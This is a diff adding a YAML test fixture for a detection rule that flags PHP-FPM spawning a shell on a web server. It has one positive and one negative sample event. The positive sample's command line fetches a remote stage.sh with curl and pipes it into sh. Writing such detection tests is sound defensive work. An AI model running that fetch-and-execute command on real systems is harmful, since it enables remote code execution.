@@ -1,0 +1,24 @@
+rule: detections/rules/web_php_cgi_child_shell.yaml
+table: DeviceProcessEvents
+positive_cases:
+  - name: PHP-FPM spawning bash to fetch remote payload
+    rows:
+      - Timestamp: "2026-10-15T07:00:00Z"
+        DeviceId: "00000000-0000-0000-0000-000000000007"
+        DeviceName: "web-php-01.example.local"
+        AccountName: "www-data"
+        InitiatingProcessFileName: "php-fpm"
+        FileName: "bash"
+        ProcessCommandLine: "bash -c 'curl http://198.51.100.7/stage.sh | sh'"
+        ReportId: 7001
+negative_cases:
+  - name: PHP-FPM spawning benign image tool
+    rows:
+      - Timestamp: "2026-10-15T07:05:00Z"
+        DeviceId: "00000000-0000-0000-0000-000000000007"
+        DeviceName: "web-php-01.example.local"
+        AccountName: "www-data"
+        InitiatingProcessFileName: "php-fpm"
+        FileName: "convert"
+        ProcessCommandLine: "convert upload.png thumb.png"
+        ReportId: 7002
